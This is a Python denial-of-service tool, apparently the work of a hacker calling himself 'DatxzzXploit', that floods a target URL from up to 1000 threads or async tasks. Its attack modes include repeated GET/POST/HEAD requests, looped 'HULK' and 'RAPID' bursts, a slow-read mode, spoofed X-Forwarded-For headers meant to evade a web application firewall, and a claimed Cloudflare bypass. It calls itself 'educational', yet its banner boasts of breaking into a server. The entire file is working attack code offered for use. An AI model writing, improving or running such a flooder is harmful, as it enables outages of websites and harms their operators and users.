import requests
import threading
import random
import time
import argparse
from colorama import Fore, Style, init
import socket
import asyncio

# Initialize colorama
init(autoreset=True)

# Example methods
methods = ['GET', 'POST', 'HEAD', 'TLS', 'BYPASS', 'HULK', 'DEF', 'RAPID', 'CLOUDFLARE_BYPASS', 'BYPASS_WAF', 'HIGH_CAPACITY']

# List of User-Agent strings to randomize requests
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/50.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.16299',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15'
]

def banner():
    print(Fore.RED + """
  _ _   __ ____ __      ___   ___ 
 | | | /  \__ / \ \    / /_\ | __|
 |_  _| () |_ \  \ \/\/ / _ \| _| 
   |_| \__/___/   \_/\_/_/ \_\_| 
                      ــــــــﮩ٨ـﮩﮩ٨ـﮩ٨ـﮩﮩ٨ــــ
   
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + "Created by: DatxzzXploit")
    print(Fore.YELLOW + "Version: 3.5")
    print(Fore.RED + """
Disclaimer: This script was officially created by DatxzzXploit. I don't know whether this script works or not because I attacked the website and broke into the server. Greetings from Ethical Hacking.
""" + Style.RESET_ALL)

def send_request(url, method):
    headers = {
        'User-Agent': random.choice(user_agents),
        'Connection': 'keep-alive',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    try:
        if method == 'GET':
            requests.get(url, headers=headers)
        elif method == 'POST':
            requests.post(url, data={}, headers=headers)
        elif method == 'HEAD':
            requests.head(url, headers=headers)
        elif method == 'TLS':
            requests.get(url, headers=headers, verify=False)
        elif method == 'HULK':
            for _ in range(100):
                requests.get(url, headers=headers)
        elif method == 'DEF':
            requests.get(url, headers=headers)
        elif method == 'RAPID':
            # RAPID method: Simulate high-frequency requests with minimal delay
            for _ in range(500):  # More aggressive, higher number of requests
                requests.get(url, headers=headers)
        elif method == 'CLOUDFLARE_BYPASS':
            # Example implementation to bypass Cloudflare
            session = requests.Session()
            session.headers.update(headers)
            response = session.get(url)
            if "cf_challenge" in response.text:
                print(Fore.RED + "Cloudflare challenge detected, attempting bypass..." + Style.RESET_ALL)
                # Attempting to solve Cloudflare challenge
                # This is a simplified example and might need custom handling based on the actual challenge
                challenge_url = response.url
                session.get(challenge_url)
                # Send the normal GET request after bypass
                requests.get(url, headers=headers)
            else:
                print(Fore.GREEN + "Cloudflare bypass successful!" + Style.RESET_ALL)
        elif method == 'BYPASS_WAF':
            # WAF bypass method: Use random headers and parameters to bypass WAF
            waf_headers = {
                'User-Agent': random.choice(user_agents),
                'X-Forwarded-For': f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                'Referer': url,
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate'
            }
            requests.get(url, headers=waf_headers)
        elif method == 'HIGH_CAPACITY':
            # High capacity attack: Simulate slow loris attack
            session = requests.Session()
            session.headers.update(headers)
            response = session.get(url, stream=True)
            for chunk in response.iter_content(chunk_size=8192):
                time.sleep(0.1)  # Slow down the request to keep the connection open

        print(Fore.GREEN + f"Request sent using {method} method" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)

async def async_attack(url, method):
    while True:
        send_request(url, method)
        await asyncio.sleep(0.1)  # Small delay to reduce CPU/GPU usage

def check_port(url, port):
    try:
        socket.create_connection((url, port), timeout=5)
        return True
    except (socket.timeout, socket.error):
        return False

if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser(description="DDoS Attack Script for Educational Purposes")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-m", "--method", choices=methods, default=random.choice(methods), help="HTTP method to use for the attack")
    parser.add_argument("-t", "--threads", type=int, default=1000, help="Number of threads to use")

    args = parser.parse_args()

    url = args.url
    method = args.method
    threads = args.threads

    print(Fore.CYAN + f"Attacking {url} using {method} method with {threads} threads" + Style.RESET_ALL)

    if method in ['HIGH_CAPACITY', 'CLOUDFLARE_BYPASS']:
        # Use asyncio for these methods to reduce CPU/GPU usage
        loop = asyncio.get_event_loop()
        tasks = [asyncio.ensure_future(async_attack(url, method)) for _ in range(threads)]
        loop.run_until_complete(asyncio.wait(tasks))
    else:
        for i in range(threads):
            t = threading.Thread(target=send_request, args=(url, method))
            t.start()
            time.sleep(0.1)  # Small delay to avoid overwhelming the system immediately
